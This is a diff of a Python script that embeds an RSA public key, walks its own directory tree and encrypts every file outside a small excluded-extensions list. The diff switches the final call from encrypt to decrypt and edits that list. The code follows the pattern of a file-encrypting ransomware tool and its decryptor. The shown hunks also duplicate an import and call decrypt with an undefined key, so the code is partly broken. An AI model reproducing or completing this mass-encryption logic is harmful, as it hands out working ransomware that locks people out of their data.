@@ -1,4 +1,3 @@
-
 import os
 import base64
 from pathlib import Path
@@ -6,7 +5,6 @@ from Crypto.PublicKey import RSA
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 import binascii
-
 pubKey = b'-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAmOYeClXLaRz3sLloMuqM\nfckQfbqfFd6RrAMhWbK6XzVDmj2AJnsLtij3/UTpT3j8X2MpYlmhDPyWgPNW9k39\nafrW8jFpL9frqNOfGOtJLP2CGHgCn/zXCGJFmI8UQzu1eF6UFdlYsUwx0Z+Ia4Vp\nmS3cTXjjaCAb8TTNnjtpWKwCJjYBnZuxQIvoIG3Nl2a6tgKZdSCdMzD0nR8sj60f\nE9zKpHh0MPCW8YBMGzZmIyzS7NU5dugP3YcaRaQh8G6R+Vbi5ENsVkiFot6NA5Av\nuDfUqHLr30qF++G7oK7U2+LzppqlnmhwcFSlfeqENTippcQk5iLCgnfG2+qakKEI\ni0pVYfRUMJOpAec0ZB1G6vZA2D6ynoPSkK3vfYl7V3Nch9D1QOcJ/1CSFsBuP6gy\n8rPpQ+Oc7bhxfxhxohTv1LC8y0xYZIKtpb9cczDkGy1WVypVOuMhmFWCS4dcmK0G\nLXnpG3kRvEx1f19JsTv1SThL4cbrsDUL+nNzCFXpnt3JAgMBAAE=\n-----END PUBLIC KEY-----'
 pubKey = RSA.import_key(pubKey)
 
@@ -48,11 +46,10 @@ def scanRecurse(baseDir):
         else:
             yield from scanRecurse(entry.path)
 path = os.path.dirname(os.path.realpath(__file__))
-excludeExtension = ['.py','.pem', '.exe',''] # CHANGE THIS
+excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
 for item in scanRecurse(path): 
 	filePath = Path(item)
 	fileType = filePath.suffix.lower()
 	if fileType in excludeExtension:
 	    continue
-	print(filePath)
-	encrypt(filePath,pubKey)
+	decrypt(filePath,key)
